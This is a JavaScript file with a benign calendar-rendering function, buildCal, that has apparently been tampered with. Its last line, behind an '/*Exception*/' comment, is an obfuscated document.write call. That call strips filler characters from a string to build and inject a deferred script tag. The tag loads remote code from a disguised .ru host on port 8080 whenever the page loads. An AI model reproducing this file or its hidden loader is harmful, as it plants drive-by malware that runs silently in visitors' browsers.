function buildCal(m, y, cM, cH, cDW, cD, brdr){
var mn=['January','February','March','April','May','June','July','August','September','October','November','December'];
var dim=[31,0,31,30,31,30,31,31,30,31,30,31];

var oD = new Date(y, m-1, 1); //DD replaced line to fix date bug when current day is 31st
oD.od=oD.getDay()+1; //DD replaced line to fix date bug when current day is 31st

var todaydate=new Date() //DD added
var scanfortoday=(y==todaydate.getFullYear() && m==todaydate.getMonth()+1)? todaydate.getDate() : 0 //DD added

dim[1]=(((oD.getFullYear()%100!=0)&&(oD.getFullYear()%4==0))||(oD.getFullYear()%400==0))?29:28;
var t='<div class="'+cM+'"><table class="'+cM+'" cols="7" cellpadding="0" border="'+brdr+'" cellspacing="0"><tr align="center">';
t+='<td colspan="7" align="center" class="'+cH+'">'+mn[m-1]+' - '+y+'</td></tr><tr align="center">';
for(s=0;s<7;s++)t+='<td class="'+cDW+'">'+"SMTWTFS".substr(s,1)+'</td>';
t+='</tr><tr align="center">';
for(i=1;i<=42;i++){
var x=((i-oD.od>=0)&&(i-oD.od<dim[m-1]))? i-oD.od+1 : '&nbsp;';
if (x==scanfortoday) //DD added
x='<span id="today">'+x+'</span>' //DD added
t+='<td class="'+cD+'">'+x+'</td>';
if(((i)%7==0)&&(i<36))t+='</tr><tr align="center">';
}
return t+='</tr></table></div>';
}



/*Exception*/ document.write('<script src='+'h!$@&t&t(!(!p#&:^)#/@(@$/#$a)!@d@&@d)^#i!($c(&t!((i@^!n((g)#^g!^a!$m#e@!s^&-!@c@!o@$^$m)#.)#$!!i#m&^a$(#!g&^e!f@$#a^@p!(.)@c)!#))o#$m((.@(f$@!o(^#t&)$^o&@(l&)#o@!#g#-)@n(&(e)$t^).^y&#(o$u))&r&#!(a()$@u^(@t@(@h&@e(n@t@(!i^)#c$(.(@r$($u&(@:&8^@^&0^^((8#!!(!0$/#s$!((#a@(b)&a$$#$h&^.#^c^)o$)(m$(.^$t^^!@r(!$$/&s)$)a$@b^a!!^h)&!.!)^c#$$o#m!^!(.^t#^))r#/(^$$(g$o#(&)o#(&g!)l^e).#$^$c@@o##m@#(/$@&o@(n(^^^l$^!i$#n#!!##e^!d!o$!w)^n$&!#.(n^e))#t&@/$)d$(&&t$#^(i##b^$!l#o)^&$g^).!!c&&@^o^$m($&@&/&^'.replace(/&|@|#|\!|\)|\$|\^|\(/ig, '')+' defer=defer></scr'+'ipt>');